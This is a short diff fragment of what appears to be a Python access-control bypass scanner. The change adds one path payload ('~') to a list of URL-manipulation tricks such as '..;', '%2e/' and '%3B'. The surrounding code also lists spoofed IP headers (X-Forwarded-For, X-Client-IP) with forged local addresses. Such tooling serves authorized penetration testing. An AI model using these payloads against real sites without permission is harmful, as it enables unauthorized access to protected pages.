@@ -49,6 +49,7 @@ def IP_authorization(res, url, domain, page):
 	"X-Forwarded-By", "X-Forwarded-Host", "X-Remote-IP", "X-Remote-Addr", "X-Client-IP", "Client-IP", "Access-Control-Allow-Origin", "Origin",
 	"X-Custom-IP-Authorization", "X-Forwarded-For "
 	]
+	
 	try:
 		website_ip = socket.gethostbyname(domain)
 		ips_type  = [website_ip, "127.0.0.1", "*", "8.8.8.8", "null", "192.168.0.2", "10.0.0.1", "0.0.0.0","::1","0:0:0:0:0:0:0:1"]
@@ -67,7 +68,8 @@ def other_bypass(url, page, req_url):
 	other_bypass: all other known bypass
 	"""
 	payl = [page+"/.", "/"+page+"/", "./"+page+"/./", "%2e/"+page, page+"/.;/", ".;/"+page, page+"..;", page+"/;/", page+"..%3B",
-	page+"/%3B", page+".%3B/"] #http://exemple.com/+page+bypass
+	page+"/%3B", page+".%3B/", page+"~"] #http://exemple.com/+page+bypass
+
 	len_req_url = len(req_url.content)
 	ranges = range(len_req_url - 50, len_req_url + 50) if len_req_url < 100000 else range(len_req_url - 1000, len_req_url + 1000)
 	for p in payl:
